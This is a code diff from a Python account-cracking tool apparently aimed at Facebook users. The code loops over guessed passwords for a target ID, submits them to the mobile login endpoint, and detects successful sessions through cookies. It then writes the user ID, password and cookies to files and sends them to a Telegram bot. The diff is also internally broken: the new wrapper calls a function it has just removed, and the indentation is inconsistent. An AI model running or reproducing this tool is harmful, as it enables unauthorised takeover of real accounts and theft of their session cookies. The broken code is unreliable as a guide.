@@ -1182,66 +1182,67 @@ def m3(idf,pwv):
       waktu(31)
   loop+=1
 
-async def m4(idf,pwv):
- global loop
- global ok
- global agents
- animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
- sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
- async with aiohttp.ClientSession() as session:
-  try:
-   for ps in pwv:
-    ua = random.choice(usragent)
-    free_fb = await session.get('https://m.facebook.com')
-    free_fb_text = await free_fb.text()
-    log_data = {'jazoest': re.search('name="jazoest" value="(.*?)"', free_fb_text).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', free_fb_text).group(1), 'email': idf, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', free_fb_text).group(1), ps) }
-    header_freefb =  {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-User': '?1',
-    'Sec-Fetch-Dest': 'document',
-    'Cache-Control': 'max-age=0',
-    'Referer': 'https://mbasic.beta.facebook.com/',
-    'DNT': '1',
-    'Pragma': 'no-cache',
-    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-    lo = await session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
-    lo_text = await lo.text()
-    log_cookies = session.cookie_jar.filter_cookies('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101')
-    if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-      coki = ";".join([f"{cookie.name}={cookie.value}" for cookie in log_cookies])
-      user = re.findall('c_user=(.*);xs', coki)[0]
-      url = f"https://graph.facebook.com/{user}/picture?type=normal"
-      reqx = await session.get(url)
-      reqx_text = await reqx.text()
-      if 'Photoshop' in reqx_text:
-            print(f'\r\r[P][ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
-            with open('/sdcard/ATOM-live-OK.txt', 'a') as f:
-                f.write(f"{user}|{ps}|{coki}\n")    
-            statusok = f"{user} | {ps} | {coki}"
-            async with session.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={statusok}") as resp:
-                ok += 1
-                break
-    elif 'checkpoint' in log_cookies:
+async def main():
+ await king_xd.submit(m4, idf, pwv)
+  global loop
+  global ok
+  global agents
+  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+  async with aiohttp.ClientSession() as session:
+   try:
+    for ps in pwv:
+     ua = random.choice(usragent)
+     free_fb = await session.get('https://m.facebook.com')
+     free_fb_text = await free_fb.text()
+     log_data = {'jazoest': re.search('name="jazoest" value="(.*?)"', free_fb_text).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', free_fb_text).group(1), 'email': idf, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', free_fb_text).group(1), ps) }
+     header_freefb =  {
+     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+     'Accept-Language': 'en-US,en;q=0.9',
+     'Accept-Encoding': 'gzip, deflate, br',
+     'Connection': 'keep-alive',
+     'Upgrade-Insecure-Requests': '1',
+     'Sec-Fetch-Site': 'same-origin',
+     'Sec-Fetch-Mode': 'navigate',
+     'Sec-Fetch-User': '?1',
+     'Sec-Fetch-Dest': 'document',
+     'Cache-Control': 'max-age=0',
+     'Referer': 'https://mbasic.beta.facebook.com/',
+     'DNT': '1',
+     'Pragma': 'no-cache',
+     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
+     lo = await session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
+     lo_text = await lo.text()
+     log_cookies = session.cookie_jar.filter_cookies('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101')
+     if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
        coki = ";".join([f"{cookie.name}={cookie.value}" for cookie in log_cookies])
-       coki1 = coki.split("1000")[1]
-       uid = "1000"+coki1[0:11]
-       if 'y' in cp_xdx:
-        print(f'\r[P][ATOM-CP.txt] {uid}|{ps}{xxx}')
-       with open('/sdcard/ATOM-CP.txt', 'a') as f:
-         f.write(f"{uid}|{ps}|\n")
-       cp.append(uid)  
-    else:
-      continue
-    await asyncio.sleep(0.1)
-   loop+=1
+       user = re.findall('c_user=(.*);xs', coki)[0]
+       url = f"https://graph.facebook.com/{user}/picture?type=normal"
+       reqx = await session.get(url)
+       reqx_text = await reqx.text()
+       if 'Photoshop' in reqx_text:
+             print(f'\r\r[P][ATOM-OK]: {user} | {ps}')
+             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+             with open('/sdcard/ATOM-live-OK.txt', 'a') as f:
+                 f.write(f"{user}|{ps}|{coki}\n")    
+             statusok = f"{user} | {ps} | {coki}"
+             async with session.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={statusok}") as resp:
+                 ok += 1
+                 break
+     elif 'checkpoint' in log_cookies:
+        coki = ";".join([f"{cookie.name}={cookie.value}" for cookie in log_cookies])
+        coki1 = coki.split("1000")[1]
+        uid = "1000"+coki1[0:11]
+        if 'y' in cp_xdx:
+         print(f'\r[P][ATOM-CP.txt] {uid}|{ps}{xxx}')
+        with open('/sdcard/ATOM-CP.txt', 'a') as f:
+          f.write(f"{uid}|{ps}|\n")
+        cp.append(uid)  
+     else:
+       continue
+     await asyncio.sleep(0.1)
+    loop+=1
   
   except aiohttp.ClientError as e:
      print(f"An error occurred: {e}")
